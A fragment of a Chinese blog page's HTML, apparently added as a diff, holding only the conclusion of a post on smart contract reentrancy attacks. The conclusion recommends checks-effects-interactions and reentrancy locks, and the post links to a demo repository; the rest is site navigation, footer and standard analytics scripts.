+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>重入攻击时一种常见的合约攻击手段，在以太坊历史上也产生过重大的资产损失。预防重入攻击的方式主要有检查-生效-交互和重入锁。新手在开发合约时，推荐使用重入锁(<code>nonReentrant</code>修饰符)，预防重入攻击</p>
+<h2 id="代码仓库"><a href="#代码仓库" class="headerlink" title="代码仓库"></a>代码仓库</h2><p><a target="_blank" rel="noopener" href="https://github.com/demo-box/blockchain-demo/tree/main/reentrancy">https://github.com/demo-box/blockchain-demo/tree/main/reentrancy</a></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/beilunyang">About</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/beilunyang">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%A4%A7%E4%BA%8B%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">重大事件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%BC%94%E7%A4%BA"><span class="toc-number">3.</span> <span class="toc-text">代码演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D%E5%92%8C%E9%A2%84%E9%98%B2"><span class="toc-number">4.</span> <span class="toc-text">如何修复和预防</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5-%E7%94%9F%E6%95%88-%E4%BA%A4%E4%BA%92%EF%BC%88checks-effect-interaction%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">检查-生效-交互（checks-effect-interaction）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%85%A5%E9%94%81"><span class="toc-number">4.2.</span> <span class="toc-text">重入锁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">5.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E4%BB%93%E5%BA%93"><span class="toc-number">6.</span> <span class="toc-text">代码仓库</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&text=智能合约安全之重入攻击"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&title=智能合约安全之重入攻击"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&is_video=false&description=智能合约安全之重入攻击"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=智能合约安全之重入攻击&body=Check out this article: https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&title=智能合约安全之重入攻击"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&title=智能合约安全之重入攻击"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&title=智能合约安全之重入攻击"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&title=智能合约安全之重入攻击"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&name=智能合约安全之重入攻击&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&t=智能合约安全之重入攻击"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    beilunyang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/beilunyang">About</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/beilunyang">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?ff79330890944419b7024a1981a182d6";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
